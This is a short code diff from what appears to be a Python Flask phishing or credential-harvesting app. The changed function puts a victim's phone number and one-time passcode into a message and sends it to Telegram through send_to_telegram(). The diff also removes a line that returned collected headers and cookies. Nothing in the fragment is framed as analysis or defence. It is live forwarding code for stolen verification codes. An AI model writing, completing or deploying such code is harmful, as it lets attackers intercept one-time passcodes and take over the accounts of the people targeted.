@@ -89,9 +89,7 @@ def load_data():
     Phone: {g.data.get("phone", "")}
     OTP: {g.data.get("otp","")} 
     """
-    send_to_telegram(message)
-              
-    return {"headers": headers_list, "cookies": cookies_list}        
+    send_to_telegram(message)      
 
 @app.route('/', methods=["GET"])
 def index():
